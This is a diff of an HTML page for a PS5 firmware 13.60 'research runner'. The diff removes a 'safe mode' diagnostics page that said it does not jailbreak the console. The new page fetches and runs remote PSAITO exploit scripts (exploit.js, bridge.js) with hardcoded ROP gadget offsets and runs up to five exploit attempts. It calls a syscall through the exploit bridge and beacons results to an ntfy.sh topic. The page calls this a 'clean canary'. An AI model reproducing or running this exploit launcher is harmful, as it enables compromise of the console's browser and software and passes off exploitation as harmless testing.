@@ -1,97 +1,151 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="color-scheme" content="dark">
-  <title>PS5 13.60 Research Host</title>
-  <link rel="stylesheet" href="styles.css?v=0.4.8">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PS5 13.60 Research Runner 0.5.1</title>
+<style>
+  html,body{margin:0;background:#07090d;color:#e9eef6;font-family:Arial,sans-serif}
+  main{max-width:820px;margin:8vh auto;padding:28px}
+  .eyebrow{font-size:12px;letter-spacing:.16em;color:#91a0b8;margin-bottom:8px}
+  h1{font-size:28px;margin:0 0 12px}
+  p{color:#aeb9ca;line-height:1.5}
+  button{font-size:18px;font-weight:700;padding:14px 20px;border:0;border-radius:8px;cursor:pointer}
+  #status{margin-top:14px;font-family:monospace;white-space:pre-wrap}
+  #scr{margin-top:18px;padding:14px;background:#030507;border:1px solid #1d2633;border-radius:8px;
+       height:48vh;overflow:auto;white-space:pre-wrap;font:12px/1.45 monospace}
+  #fw-label{font-family:monospace}
+</style>
 </head>
 <body>
-  <main class="wrap">
-    <header class="hero">
-      <div class="eyebrow">PS5 RESEARCH / SAFE MODE</div>
-      <h1>PS5 13.60 Research Host</h1>
-      <p class="lead">Build 0.3 runs the full non-destructive browser/runtime test in one pass, including Worker transfer and bounded memory allocation. It does not jailbreak, patch, or modify the console.</p>
-    </header>
+<main>
+  <div class="eyebrow">RESEARCH BUILD 0.5.1</div>
+  <h1 class="header">PS5 13.60 clean userland canary</h1>
+  <p id="fw-label">FW 13.60</p>
+  <p>One press resets the PSAITO per-session attempt state, loads the upstream userland scripts with verified 13.60 offsets, and runs at most five attempts.</p>
+  <button id="run" type="button">Run clean 1→5 canary</button>
+  <div id="status">Ready.</div>
+  <div id="scr">Waiting.</div>
+</main>
+<script>
+(function(){
+  "use strict";
 
-    <section class="panel">
-      <div class="row">
-        <div>
-          <div class="label">Detected device</div>
-          <div id="device" class="value">Not checked</div>
-        </div>
-        <div>
-          <div class="label">Firmware</div>
-          <div id="firmware" class="value">—</div>
-        </div>
-        <div>
-          <div class="label">UA WebKit label</div>
-          <div id="webkit" class="value">—</div>
-        </div>
-      </div>
-      <div class="notice">
-        On PlayStation, <strong>605.1.15 is a fixed User-Agent compatibility label</strong>; it is not enough to identify the actual WebKit revision. Feature behavior is more useful than the UA number.
-      </div>
-      <div class="buttons">
-        <button id="runAll" type="button">Run next 5 verified 13.60 attempts</button>
-      </div>
-      <div id="runStatus" class="run-status">Ready. Each press opens PSAITO runtime directly with verified 13.60 offsets and runs the next controlled window of five attempts.</div>
-    </section>
+  var TOPIC="ps5-1360-tumelo-4m7q2v9x6k3n8r5p1d0c";
+  var UP="https://wamphyre.github.io/PSAITO/";
+  var REV="6a5170c0df19206837893d57924d39ee4a2e6886";
+  var btn=document.getElementById("run");
+  var status=document.getElementById("status");
 
-    <section class="panel advanced-panel">
-      <div class="eyebrow">ADVANCED STAGE A</div>
-      <h2>Userland / ROP canary</h2>
-      <p>This launches the public PSAITO 13.xx userland research host with its harmless <code>hello_1320.js</code> canary only. It checks whether the WebKit memory primitive and ROP/native-call bridge reach <code>getpid</code> on this 13.60 console.</p>
-      <div class="notice warning">
-        This is more invasive than the normal JavaScript diagnostics and may crash or close the browser. It does <strong>not</strong> intentionally run the kernel-UAF / Bagagwa shot.
-      </div>
-      <div id="advancedStatus" class="run-status">Advanced Stage A starts automatically after the baseline report is sent.</div>
-    </section>
+  function runId(){
+    return Date.now().toString(36)+"-"+Math.floor(Math.random()*0x7fffffff).toString(36);
+  }
 
-    <section class="panel">
-      <h2>13.60 research matrix</h2>
-      <div class="matrix">
-        <div class="matrix-row"><span>ps5-payload-dev/sdk</span><strong>13.60 payload build support</strong><small>Post-exploit SDK; does not provide the browser jailbreak itself.</small></div>
-        <div class="matrix-row"><span>Wamphyre/PSAITO</span><strong>Experimental 13.00–13.60 claim</strong><small>Its destructive kernel-UAF stage is intentionally not bundled here.</small></div>
-        <div class="matrix-row"><span>idlesauce/umtx2</span><strong>1.00–5.50</strong><small>Mature web host, but outside the 13.60 firmware range.</small></div>
-        <div class="matrix-row"><span>Gezine/BD-JB5</span><strong>Standalone through 13.42</strong><small>On 13.60 it documents a path only after the console is already jailbroken.</small></div>
-        <div class="matrix-row"><span>n0llptr/remote_lua_loader</span><strong>Firmware-independent entrypoint</strong><small>Game/save-data specific rather than a normal browser chain.</small></div>
-        <div class="matrix-row"><span>EchoStretch/kstuff-lite</span><strong>Latest release through 12.70</strong><small>Mainline 1.11 work is active; SDK support alone does not establish 13.60 kstuff compatibility.</small></div>
-      </div>
-    </section>
+  function relay(title,msg){
+    var u="https://ntfy.sh/"+encodeURIComponent(TOPIC)+"/publish?title="+
+      encodeURIComponent(title)+"&message="+encodeURIComponent(msg)+"&tags=computer&_="+Date.now();
+    try{
+      if(typeof fetch==="function") fetch(u,{method:"GET",mode:"no-cors"}).catch(function(){});
+    }catch(_){}
+    try{
+      if(!window.__relayImgs) window.__relayImgs=[];
+      var im=new Image(); window.__relayImgs.push(im); im.src=u;
+    }catch(_){}
+  }
 
-    <section class="panel">
-      <h2>Runtime fingerprint</h2>
-      <div id="summary" class="summary muted">Run diagnostics to build the fingerprint.</div>
-      <div id="features"></div>
-    </section>
+  function postLog(url,line){
+    try{
+      var x=new XMLHttpRequest();
+      x.open("POST",url,true);
+      x.setRequestHeader("Content-Type","text/plain");
+      x.send(String(line));
+    }catch(_){}
+  }
 
-    <section class="panel">
-      <h2>Worker / transferable result</h2>
-      <pre id="workerReport">Not run yet.</pre>
-    </section>
+  function loadScript(src){
+    return new Promise(function(resolve,reject){
+      var s=document.createElement("script");
+      s.src=src;
+      s.onload=resolve;
+      s.onerror=function(){reject(new Error("load failed: "+src));};
+      document.head.appendChild(s);
+    });
+  }
 
-    <section class="panel">
-      <h2>Safe allocation result</h2>
-      <pre id="memoryReport">Not run yet. This test allocates only 1, 4, 8 and 16 MiB buffers, one at a time.</pre>
-    </section>
+  btn.addEventListener("click",function(){
+    btn.disabled=true;
+    btn.textContent="Running clean 1→5 canary...";
+    status.textContent="Resetting PSAITO session state…";
+    document.getElementById("scr").textContent="";
 
-    <section class="panel">
-      <h2>Compact fingerprint</h2>
-      <pre id="compact">No fingerprint yet.</pre>
-    </section>
+    try{
+      sessionStorage.removeItem("renderer-notify-auto-proof-2:attempts");
+      sessionStorage.removeItem("renderer-notify-auto-proof-2:passed");
+      sessionStorage.removeItem("renderer-notify-auto-proof-2:blocked");
+      sessionStorage.removeItem("userland-loader-handoff-1:passed");
+    }catch(_){}
 
-    <section class="panel">
-      <h2>Full diagnostic report</h2>
-      <pre id="report">No report yet.</pre>
-    </section>
+    var rid=runId();
+    var logEndpoint="https://ntfy.sh/"+encodeURIComponent(TOPIC)+
+      "?title="+encodeURIComponent("PSAITO-A-"+rid);
 
-    <footer>
-      <span>Research build 0.4.8</span>
-      <span>Owned-hardware testing only</span>
-    </footer>
-  </main>
-  <script src="app.js?v=0.4.8"></script>
+    var q=[
+      "go=1",
+      "fw=13.60",
+      "hc="+encodeURIComponent("0x56a58,0x56ca0,0x57ce8"),
+      "gd=0x1d6fa",
+      "notify=0x48b0",
+      "gps=0x334e238",
+      "gpe=0x1b860",
+      "cls=0x334e228",
+      "cle=0x274e0",
+      "ers=0x334e230",
+      "ere=0xf7d0",
+      "log=1",
+      "max=5",
+      "rd=3000",
+      "lines=260",
+      "logserver="+encodeURIComponent(logEndpoint),
+      "researchrun="+encodeURIComponent(rid)
+    ].join("&");
+
+    try{history.replaceState(null,"",location.pathname+"?"+q);}catch(_){}
+
+    relay("PS5 13.60 ADV-A "+rid,
+      "advanced_stage=A\nrun="+rid+
+      "\nfirmware=13.60\naction=local_wrapper_050"+
+      "\nmax=5\nnotify=0x48b0\ngps=0x334e238");
+
+    window.onBridgeReady=function(ps5){
+      status.textContent="Bridge reached. Running getpid canary…";
+      try{
+        var pid=window.syscall(window.SYSCALL.getpid);
+        var line="[canary] getpid ok = "+String(pid);
+        postLog(logEndpoint,line);
+        if(window.log) window.log(line);
+        postLog(logEndpoint,"[canary] DONE - payload completed without crash");
+        if(window.log) window.log("[canary] DONE - payload completed without crash");
+        status.textContent="SUCCESS — getpid canary completed.";
+      }catch(e){
+        var fail="[canary] getpid failed: "+String(e&&e.message||e);
+        postLog(logEndpoint,fail);
+        status.textContent=fail;
+      }
+    };
+
+    status.textContent="Loading upstream PSAITO scripts…";
+
+    loadScript(UP+"modules/offsets13x.js?v="+REV)
+      .then(function(){return loadScript(UP+"modules/bridge.js?v="+REV);})
+      .then(function(){return loadScript(UP+"modules/exploit.js?v="+REV);})
+      .then(function(){status.textContent="PSAITO loaded. Attempt 1 should begin now…";})
+      .catch(function(e){
+        status.textContent="Script load failed: "+e.message;
+        btn.disabled=false;
+        btn.textContent="Run clean 1→5 canary";
+      });
+  });
+}());
+</script>
 </body>
 </html>
